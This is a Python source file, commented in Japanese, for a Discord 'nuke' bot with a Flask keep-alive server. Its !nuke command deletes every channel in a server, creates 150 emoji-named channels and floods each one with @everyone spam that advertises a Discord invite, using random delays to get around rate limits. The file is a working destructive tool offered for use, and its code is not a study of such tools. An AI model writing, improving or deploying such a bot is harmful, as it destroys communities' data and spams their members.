import os
import threading
import discord
from discord.ext import commands
from discord import utils
from flask import Flask, jsonify
import logging
import asyncio
import random 

# ログ設定: 警告レベル以上のみ表示
logging.basicConfig(level=logging.WARNING)

# --- KeepAlive用: Flaskアプリの定義 ---
app = Flask(__name__)

# --- Discord Bot Setup ---
intents = discord.Intents.default()
# 破壊機能に必要なインテントを全て有効化
intents.guilds = True
intents.members = True 
intents.message_content = True 

# 🚨 Prefixを '!' に設定
bot = commands.Bot(command_prefix="!", intents=intents)

# 環境変数からの設定
try:
    DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN") 
    
    if not DISCORD_BOT_TOKEN:
        logging.error("FATAL ERROR: 'DISCORD_BOT_TOKEN' is missing. Please set the environment variable.")

except Exception as e:
    DISCORD_BOT_TOKEN = None
    logging.error(f"Initialization Error: {e}")


# ----------------------------------------------------
# --- 💀 最終破壊機能 (!nuke コマンド) ---
# ----------------------------------------------------

@bot.command(name="nuke") 
@commands.has_permissions(administrator=True) # 管理者権限が必要
async def ultimate_nuke_command(ctx): 
    
    guild = ctx.guild
    
    # 実行中メッセージ (即時削除されるためログ代わり)
    await ctx.send(
        f"🔥🔥🔥 **INSTANT DELETION STARTED!** 猶予なし！{ctx.author.mention} の命令により、今すぐ全チャンネルを消し飛ばす！ 🔥🔥🔥"
    )

    # 1. 全てのチャンネルを削除
    deletion_tasks = []
    for channel in guild.channels:
        deletion_tasks.append(asyncio.create_task(channel.delete()))
    
    try:
        await asyncio.gather(*deletion_tasks)
        # APIのクールダウンを待つための遅延
        await asyncio.sleep(0.5) 
    except Exception as e:
        logging.error(f"チャンネル削除中にエラーが発生したぜ。: {e}")

    # 2. 絵文字チャンネルを150個作成
    creation_tasks = []
    
    # 🚨 ここを修正: チャンネル数を150個に設定
    num_channels_to_create = 150
    
    # 絵文字リスト (10種類)
    EMOJIS = "😀😂🤣😇🤓🤪🤩🤔😈☠️💀😹" 
    EMOJI_LIST = list(EMOJIS) 
    
    channel_names = []
    # チャンネル名生成ロジック: 10種類の絵文字をそれぞれ15回ずつ使う (10 * 15 = 150)
    # 繰り返しの回数を20回から15回に変更
    for i in range(15): 
        for emoji in EMOJI_LIST: 
            channel_names.append(f"{emoji}-nuke-{i}") 
            
    num_channels = len(channel_names)
    logging.warning(f"🔨 CREATION STARTED! {num_channels}個の絵文字チャンネルを作成する！")

    for name in channel_names:
        creation_tasks.append(asyncio.create_task(guild.create_text_channel(name)))
    
    successful_channels = []
    try:
        new_channels = await asyncio.gather(*creation_tasks)
        successful_channels = [c for c in new_channels if isinstance(c, discord.TextChannel)]
        # チャンネル作成完了後、APIのクールダウンを待つ
        await asyncio.sleep(1.0) 
    except Exception as e:
        logging.error(f"チャンネル作成中にエラーが発生したぜ。: {e}")

    # 3. 全ての新しいチャンネルにスパムメッセージを15回送信 (ランダム遅延付き)
    if successful_channels:
        # 🚨 スパム内容
        spam_message_content = (
            "# @everyoneruru by nuke😂\n"
            "# ⬇️join now⬇️\n"
            "https://discord.gg/Uv4dh5nZz6\n"
            "https://imgur.com/NbBGFcf"
        )
        spam_count = 15
        
        await successful_channels[0].send(f"📣 **SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から {spam_count}回 の**宣伝スパム**を送りつけるぞ！")

        spam_tasks = []
        for channel in successful_channels:
            # チャンネルごとに15回メッセージを送信するタスクを作成
            async def send_spam_burst(ch, msg, count):
                for _ in range(count):
                    try:
                        await ch.send(msg)
                        # 0.5秒から1.5秒のランダム遅延を導入してレート制限を回避
                        await asyncio.sleep(random.uniform(0.5, 1.5)) 
                    except Exception:
                        # レート制限やその他のエラーが発生した場合は中断
                        break
            
            spam_tasks.append(asyncio.create_task(send_spam_burst(channel, spam_message_content, spam_count)))
            
        try:
            await asyncio.gather(*spam_tasks)
        except Exception as e:
            logging.error(f"スパム送信中にエラーが発生したぜ。: {e}")

    # 4. 最終報告
    if successful_channels:
        await successful_channels[0].send(
            f"👑 **SERVER NUKE COMPLETE!** サーバーは {ctx.author.mention} によって再構築され、**絵文字と宣伝で汚染された**！\n"
            f"**最終作成チャンネル数**: {len(successful_channels)} 個だ！"
        )
    

# ----------------------------------------------------
# --- Discord イベント & 起動 ---
# ----------------------------------------------------

@bot.event
async def on_ready():
    """Bot起動時に実行"""
    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Game(name="サーバーを破壊中... !nuke")
    )
    logging.warning(f"Bot {bot.user} is operational and ready to cause chaos!")
    
    logging.warning("スラッシュコマンドは無視。!nukeコマンドが有効になったぜ。")

@bot.event
async def on_message(message):
    """メッセージイベント"""
    if message.author.bot:
        return
        
    await bot.process_commands(message)


# ----------------------------------------------------
# --- KeepAlive Server (Render/Uptime Robot対応) ---
# ----------------------------------------------------

def start_bot():
    """Discord Botの実行を別スレッドで開始する"""
    global DISCORD_BOT_TOKEN
    if not DISCORD_BOT_TOKEN:
        logging.error("Botの実行をスキップ: トークンが設定されてねえぞ。")
    else:
        logging.warning("Discord Botを起動中... 破壊の時だ。")
        try:
            # log_handler=None を指定してDiscord.pyのログを抑制
            bot.run(DISCORD_BOT_TOKEN, log_handler=None) 
            
        except discord.errors.LoginFailure:
            logging.error("ログイン失敗: Discord Bot Tokenが無効だ！")
        except Exception as e:
            logging.error(f"予期せぬエラーが発生した: {e}")

# Botを別スレッドで起動
bot_thread = threading.Thread(target=start_bot)
bot_thread.start()

@app.route("/")
def home():
    """UptimeRobotからのヘルスチェックに応答するエンドポイント"""
    if bot.is_ready():
        return "Bot is running and ready for INSTANT NUKE!"
    else:
        # Botの起動が完了していない場合は503エラーを返す
        return "Bot is starting up or failed to start...", 503

@app.route("/keep_alive", methods=["GET"])
def keep_alive_endpoint():
    """冗長的なヘルスチェックエンドポイント"""
    return jsonify({"message": "Alive. Now go break something."}), 200
